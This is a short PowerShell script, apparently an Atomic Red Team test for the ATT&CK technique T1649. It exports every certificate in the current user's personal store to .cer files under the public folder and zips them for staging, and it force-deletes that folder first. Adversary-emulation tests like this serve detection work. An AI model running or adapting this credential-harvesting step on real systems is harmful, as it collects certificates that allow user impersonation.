$archive="$env:PUBLIC\T1649\atomic_certs.zip"
$exfilpath="$env:PUBLIC\T1649\certs"
Add-Type -assembly "system.io.compression.filesystem"
Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore
New-Item -Path $exfilpath -ItemType Directory | Out-Null
foreach ($cert in Get-ChildItem Cert:\CurrentUser\My) { Export-Certificate -Cert $cert -FilePath "$exfilpath\$($cert.FriendlyName).cer"}
[System.IO.Compression.ZipFile]::CreateFromDirectory($exfilpath, $archive)
